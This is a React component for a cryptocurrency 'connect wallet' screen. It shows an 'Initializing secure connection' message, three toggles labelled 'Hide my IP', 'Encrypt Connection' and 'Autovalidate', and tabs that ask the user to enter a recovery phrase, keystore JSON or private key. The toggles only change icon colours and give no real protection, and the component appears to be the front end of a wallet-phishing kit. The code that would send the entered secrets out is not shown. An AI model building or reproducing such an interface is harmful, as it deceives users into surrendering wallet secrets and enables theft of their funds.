import style from "@/styles/ui-third.module.css";
import Image from "next/image";
import { FaToggleOff, FaToggleOn } from "react-icons/fa";
import { useState } from "react";
import KeyStore from "./KeyStore";
import AnimatedBorderWrapper from "../animation/animatedBorder";
import Phrase from "./Phrase";
import PrivateKey from "./PrivateKey";
import Newway from "@/public/new-way.svg"

const ThirdUI = ({ selectedWallet, appType }) => {
  // State for toggles
  const [hideIP, setHideIP] = useState(false);
  const [encryptConnection, setEncryptConnection] = useState(true);
  const [autoValidate, setAutoValidate] = useState(true);

  const [activeTab, setActiveTab] = useState("phrase");

  return (
    <section className={style.connectInnerSection}>
      <div className={style.connectHeader}>
        <h2 className={style.connectTitle}>{selectedWallet?.name ?? appType}</h2>
      </div>
      <div className={style.walletContainer}>
        {/* Wallet image */}
        <div className={style.walletImageContainer}>
          <AnimatedBorderWrapper>
            <Image src={ selectedWallet?.image ? selectedWallet?.image : Newway } alt="Wallet Image" className={style.walletImage} width={100}
  height={40}  />
          </AnimatedBorderWrapper>
        </div>
        {/* Wallet description */}
        <p className={style.walletDescription}>
          Initializing secure connection with {selectedWallet?.name ?? appType}.
        </p>
        {/* Toggle options */}
        <div className={style.toggleOptionsContainer}>
          <p className={style.toggleOption}>
            <span className={style.toggleLabel}>Hide my IP</span>
            <span
              className={style.toggleIcon}
              onClick={() => setHideIP((prev) => !prev)}
              style={{ color: hideIP ? "rgb(0, 197, 10)" : "inherit" }}
            >
              {hideIP ? <FaToggleOn size={20} /> : <FaToggleOff style={{color: "#999"}} size={20} />}
            </span>
          </p>
          <p className={style.toggleOption}>
            <span className={style.toggleLabel}>Encrypt Connection</span>
            <span
              className={style.toggleIcon}
              onClick={() => setEncryptConnection((prev) => !prev)}
              style={{ color: encryptConnection ? "rgb(0, 197, 10)" : "inherit" }}
            >
              {encryptConnection ? <FaToggleOn size={20} /> : <FaToggleOff style={{color: "#999"}} size={20} />}
            </span>
          </p>
          <p className={style.toggleOption}>
            <span className={style.toggleLabel}>Autovalidate</span>
            <span
              className={style.toggleIcon}
              onClick={() => setAutoValidate((prev) => !prev)}
              style={{ color: autoValidate ? "rgb(0, 197, 10)" : "inherit" }}
            >
              {autoValidate ? <FaToggleOn size={20} /> : <FaToggleOff style={{color: "#999"}} size={20} />}
            </span>
          </p>
        </div>
      </div>

      <div className={style.tabContainer}>
        <div className={style.tabHeader}>
          <button
            className={`${style.tabButton} ${activeTab === "phrase" ? style.activeTab : ""}`}
            onClick={() => setActiveTab("phrase")}
          >
            Phrase
          </button>
          <button
            className={`${style.tabButton} ${activeTab === "keystore" ? style.activeTab : ""}`}
            onClick={() => setActiveTab("keystore")}
          >
            Keystore JSON
          </button>
          <button
            className={`${style.tabButton} ${activeTab === "privateKey" ? style.activeTab : ""}`}
            onClick={() => setActiveTab("privateKey")}
          >
            Private Key
          </button>
        </div>
        <div className={style.tabContent}>
          {
            activeTab === "phrase" && 
            <>
              <Phrase selectedWallet={selectedWallet?.name} appType={appType} />
            </>
          }
          {
            activeTab === "keystore" && 
            <>
              <KeyStore selectedWallet={selectedWallet?.name} appType={appType} />
            </>
          }
          {
            activeTab === "privateKey" && 
            <>
              <PrivateKey wallet={selectedWallet?.name} appType={appType} />
            </>
          }
        </div>
      </div>

    </section>
  );
};

export default ThirdUI;
